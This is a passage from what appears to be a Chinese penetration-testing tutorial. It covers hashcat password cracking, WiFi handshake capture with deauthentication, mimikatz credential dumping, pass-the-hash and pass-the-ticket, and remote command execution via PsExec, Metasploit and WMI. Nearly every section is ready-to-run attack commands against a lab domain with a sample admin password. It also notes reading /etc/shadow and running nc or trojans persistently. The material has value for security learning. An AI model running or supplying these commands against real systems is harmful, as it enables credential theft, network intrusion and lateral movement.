<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 8fb5a3e7338ce951971d69be27fc5210 -1 ?u?d ?1?1?1?1 --increment --increment-min 1 --increment-max 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>指定特定字符集：123456abcdf!@+- 进行破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由于在终端里可能会把部分字符识别为特殊字符，因此需要转义一下</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf\!\@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 19b9a36f0cab6d89cd4d3c21b2aa15be --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用字典破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 e10adc3949ba59abbe56e057f20f883e password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用字典批量破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 hash.txt password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字典组合破解</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 1 77b3e6926e7295494dd3be91c6934899 pwd1.txt pwd2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>经过测试，这里的字典组合破解，不是说简单的将两个字典的内容合并去重形成 1 个字典进行去重，而是说字典 1 的内容加上字典 2 的内容组合成一个字典，例如：</p>
<p>pwd1.txt 字典为：</p>
<pre class="line-numbers language-none"><code class="language-none">admintestroot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>pwd2.txt 字典为：</p>
<pre class="line-numbers language-none"><code class="language-none">@2021123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么组合后的字典就是这样的：</p>
<pre class="line-numbers language-none"><code class="language-none">admin@2021admin123test@2021test123root@2021root123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字典+掩码破解，也是和上面一样的组合方法，只不过 pwd2.txt 换成了掩码</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 6 e120ea280aa50693d5568d0071456460 pwd1.txt ?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Mysql4-1-5"><a href="#Mysql4-1-5" class="headerlink" title="Mysql4.1/5"></a>Mysql4.1/5</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值。</p>
</blockquote>
<h3 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h3><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X.&#39; ?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>可通过 cat /etc/shadow 获取哈希值</p>
</blockquote>
<p>或者不删除用户名，直接使用 –username 参数</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1&#39; ?l?l?l?l?l --username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>NT Hash</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>LM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>NetNTLM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 5500 teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 -1 ?l?u ?1?1?1?1?d?d?d?d  --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="MSSQL-2005"><a href="#MSSQL-2005" class="headerlink" title="MSSQL (2005)"></a>MSSQL (2005)</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="WordPress-密码-hash"><a href="#WordPress-密码-hash" class="headerlink" title="WordPress 密码 hash"></a>WordPress 密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 400 --force &#39;$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F;&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p>
</blockquote>
<h3 id="Discuz-用户密码-hash"><a href="#Discuz-用户密码-hash" class="headerlink" title="Discuz 用户密码 hash"></a>Discuz 用户密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>其密码加密方式 md5(md5($pass).$salt)</p>
</blockquote>
<h3 id="RAR-压缩密码"><a href="#RAR-压缩密码" class="headerlink" title="RAR 压缩密码"></a>RAR 压缩密码</h3><p>首先获取 rar 文件的 hash 值，我们可以使用另一款哈希破解工具 John 提供的 rar2john 工具将 rar 文件里的 hash 提取出来。</p>
<p>rar2john 下载地址：<a target="_blank" rel="noopener" href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p>
<pre class="line-numbers language-none"><code class="language-none"># 获取 rar 文件 hashrar2john.exe 1.rar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>hashcat 支持 RAR3-hp 和 RAR5</p>
<p>对于 RAR5，示例如下：</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13000 --force &#39;$rar5$16$b06f5f2d4c973d6235e1a88b8d5dd594$15$a520dddcc53dd4e3930b8489b013f273$8$733969e5bda903e4&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对于 RAR3-hp</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 12500 --force &#39;$RAR3$*0*5ba3dd697a8706fa*919ad1d7a1c42bae4a8d462c8537c9cb&#39; ?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>RAR3-hp 哈希头为 $RAR3$*0*，而不是 $RAR3$*1*，中间的数值是0（-hp）而不是1（-p），-p 尚未得到支持，只支持 -hp</p>
<p>关于 RAR 参数 -p 和 -hp 的区别：<br>-p：只对 RAR 文件加密，里面的目录和文件名没加密；<br>-hp：对目录中的文件名和子目录都进行加密处理</p>
</blockquote>
<h3 id="ZIP-压缩密码"><a href="#ZIP-压缩密码" class="headerlink" title="ZIP 压缩密码"></a>ZIP 压缩密码</h3><p>和 rar 破解过程一样，我们需要先提取 zip 文件的哈希值，这里可以使用 zip2john 进行获取，zip2john.exe 在上面下载的 rar2john.exe 的同级目录下。</p>
<pre class="line-numbers language-none"><code class="language-none"># 获取 zip 文件 hashzip2john.exe 1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13600 &#39;$zip2$*0*3*0*18b1a7e7ad39cb3624e54622849b23c7*5b99*3*5deee7*a418cee1a98710adce9a*$&#x2F;zip2$&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>这里 ZIP 的加密算法使用的 AES256</p>
</blockquote>
<h3 id="office-密码"><a href="#office-密码" class="headerlink" title="office 密码"></a>office 密码</h3><p>和 rar 与 zip 破解过程一样，我们需要先提取 office 文件的哈希值，这里可以使用 office2john.py 进行获取，office2john.py 在上面下载的 rar2john.exe 和 zip2john.exe 的同级目录下。</p>
<pre class="line-numbers language-none"><code class="language-none"># 获取 office 文件 hashpython office2john.py 1.docx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>测试中发现 python 会出现告警信息，不过这个告警信息不会影响程序执行</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 9600 &#39;$office$*2013*100000*256*16*cd8856416b1e14305a0e8aa8eba6ce5c*18cada7070f1410f3a836c0dfc4b9643*befcde69afeafb3e652719533c824413b00ce4a499589e5ac5bd7a7a0d3c4f3d&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>这里哈希头为 2013 所以使用 9600 破解模式，如果是 2010 则要使用 9500 破解模式，2007 则使用 9400 破解模式。</p>
</blockquote>
<h3 id="WIFI-密码"><a href="#WIFI-密码" class="headerlink" title="WIFI 密码"></a>WIFI 密码</h3><p>要破解 WIFI 密码，首先要抓到 WIFI 的握手包，要想得到 WIFI 的握手包，就需要在监听时刚好有设备连接了该 WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI 的设备踢下去，一般设备就会自动连接该 WIFI，此时我们就抓到握手包了。</p>
<p><strong>抓取 WIFI 握手包</strong></p>
<p>1、将网卡处于监听状态</p>
<pre class="line-numbers language-none"><code class="language-none">airmon-ng check airmon-ng check kill &#x2F;&#x2F; 关闭影响监听状态的进程airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>wlan0 是网卡名称，一般都是 wlan0，如果不是则需要根据自己的情况进行修改，可通过 iwconfig 进行查看网卡的名称</p>
</blockquote>
<p>当使用 iwconfig 查看网卡名称变为 wlan0mon 说明此时网卡已经处于监听模式了</p>
<p>2、扫描可用 WIFI</p>
<pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831104636.png"></p>
<p>3、获取wifi的握手包</p>
<pre class="line-numbers language-none"><code class="language-none">airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里以 ssid 为 teamssix 的 WIFI 为例</p>
<pre class="line-numbers language-none"><code class="language-none">airodump-ng -c 1 --bssid 5E:C1:1B:A2:37:F1 -w .&#x2F; wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p>
<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831105351.png"></p>
<p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p>
<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 38:26:2C:13:D3:33 wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831132010.png"></p>
<p>4、破解密码</p>
<p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p>
<pre class="line-numbers language-none"><code class="language-none">aircrack-ng 1.cap -j 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2500 1.hccapx ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831113326.png"></p>
<h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul>
<li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p>
</li>
<li><p>如果想再次破解已经破解过的密码，删除 ~/.hashcat/hashcat.potfile 文件里的对应记录即可。</p>
</li>
<li><p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p>
</li>
<li><p>在实际破解过程中，可以先使用 top 字典进行破解，不行再试试社工字典，比如姓名+生日的组合字典</p>
</li>
<li><p>Hashcat 参数优化：</p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">--gpu-accel 160			可以让GPU发挥最大性能
--gpu-loops 1024		可以让GPU发挥最大性能
--segment-size 512	    可以提高大字典破解的速度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h1 id="0x21-哈希传递与票据传递"><a href="#0x21-哈希传递与票据传递" class="headerlink" title="0x21 哈希传递与票据传递"></a>0x21 哈希传递与票据传递</h1><h2 id="1、哈希传递"><a href="#1、哈希传递" class="headerlink" title="1、哈希传递"></a>1、哈希传递</h2><p>哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。</p>
<p>通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证。</p>
<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>在目标主机上使用 mimikatz 获取 NTLM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在远程主机上以管理员权限打开 mimikatz</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901120511.png"></p>
<p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。</p>
<h3 id="AES-256-密钥"><a href="#AES-256-密钥" class="headerlink" title="AES-256 密钥"></a>AES-256 密钥</h3><p>使用 mimikatz 抓取密钥</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::ekeys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在其他远程计算机中，以管理员权限打开 mimikatz</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;aes256:7358fb65149672d99b8c9f3dfd0dfeb486b78268e9c5250b23aefbd26f293c60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这里需要目标机器上安装 KB2871997 补丁，补丁下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=42722">https://www.microsoft.com/en-us/download/details.aspx?id=42722</a></p>
<p>将该补丁安装后，就可以通过 AES256 密钥进行哈希传递了。</p>
<p>除了 AES256 外还有 AES128 等，不过平时基本都是使用 NTLM 哈希进行传递。</p>
<h2 id="2、票据传递"><a href="#2、票据传递" class="headerlink" title="2、票据传递"></a>2、票据传递</h2><p>票据传递（Pass The Ticket, PTT）是基于Kerberos认证的一种攻击方式，这里主要学习票据传递在 mimikatz 和 kekeo 两个工具里的使用。</p>
<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用 mimikatz 可以将内存中的票据进行导出。</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>执行该命令后，会在当前目录下生成多个服务的票据文件，例如 kirbi 等</p>
<p>使用以下命令可以清除内存中的票据</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将票据文件注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在当前终端下退出 mimikatz ，然后就可以列出目标目录了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901153402.png"></p>
<p>票据传递除了用 mimikatz 还可以用 kekeo</p>
<h3 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h3><p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机。</p>
<pre class="line-numbers language-none"><code class="language-none">tgt::ask &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901154851.png"></p>
<p>在 kekeo 中清除当前内存中的其他票据，不然可能会导致票据传递失败</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 Windows 命令行中也可以执行系统自带的命令进行内存中的票据清除</p>
<pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用以下命令将票据导入内存，之后 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了。</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901155501.png"></p>
<p>注意点：</p>
<p>1、票据文件注入内存的默认有效时间为 10 小时</p>
<p>2、在目标机器上不需要本地管理员权限就可以进行票据传递</p>
<p>3、使用票据传递时，dir 命令必须使用主机名，如果使用 IP 地址会提示拒绝访问。</p>
<h1 id="0x22-PsExec-和-WMI-的使用"><a href="#0x22-PsExec-和-WMI-的使用" class="headerlink" title="0x22 PsExec 和 WMI 的使用"></a>0x22 PsExec 和 WMI 的使用</h1><h2 id="1、PsExec"><a href="#1、PsExec" class="headerlink" title="1、PsExec"></a>1、PsExec</h2><h3 id="PsExec-exe"><a href="#PsExec-exe" class="headerlink" title="PsExec.exe"></a>PsExec.exe</h3><p>PsExec 在之前的文章里提到过一次，参见<a target="_blank" rel="noopener" href="https://teamssix.com/210802-181052.html">https://teamssix.com/210802-181052.html</a>，今天来着重学习一下。</p>
<p>PsExec 是 PSTools 工具包里的一部分，其下载地址为：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p>
<p>利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p>
<p>建立 ipc$ 连接</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator或者net use \\192.168.7.7 &#x2F;u:teamssix.com\administrator &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902092309.png"></p>
<p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-u 域\用户名-p 密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者执行以下命令直接回显命令结果</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe &#x2F;c &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在使用 PsExec 时需要注意以下几点：</p>
<ul>
<li>需要远程系统开启 admin$ 共享（默认是开启的）</li>
<li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li>
<li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li>
<li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li>
<li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li>
<li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</li>
</ul>
<h3 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中也有 PsExec 的利用模块，使用方法如下：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexecset rhost 192.168.7.7set smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2、WMI"><a href="#2、WMI" class="headerlink" title="2、WMI"></a>2、WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。</p>
<p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p>
<h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中</p>
<blockquote>
<p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\ip.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>之后建立 IPC$ ，使用 type 读取执行结果</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratortype \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902112523.png"></p>
<p>也可以预先建立 ipc$ 连接，再使用 wmic</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratorwmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p>
<pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902113920.png"></p>
<p>wmiexec.py 还支持通过哈希传递获得 shell</p>
<pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p>
<pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.7.7 administrator 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902122716.png"></p>
<p>使用 vmiexec.vbs 执行单条命令</p>
<pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs &#x2F;cmd 192.168.7.7 administrator 1qaz@WSX &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为这只是个半交互式的 Shell，因此对于运行时间比较长的命令，比如 ping、systeminfo 等，需要加上 -wait 5000 或更长的时间。</p>
<p>在运行 nc 等不需要输出结果但需要一直运行的进程时，可以使用 -persist 参数，当命令加了 -persist 选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，这样就可以运行 nc 或者木马程序了。</p>
<p>不过目前 vmiexec.vbs 已经被卡巴斯基、赛门铁克等杀软列入查杀名单了。</p>
<h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。</p>
<p>在 Powershell 中运行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none"># 导入 Invoke-WmiCommand.ps1 脚本
Import-Module .\Invoke-WmiCommand.ps1

# 指定目标系统用户名
$User &#x3D; &quot;teamssix.com\administrator&quot; 

# 指定目标系统的密码
$Password &#x3D; ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force

# 将账号和密码整合起来，以便导入 Credential
$Cred &#x3D; New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password

# 指定要执行的命令和目标 IP
$Remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.7.7

# 将执行结果输出到屏幕上
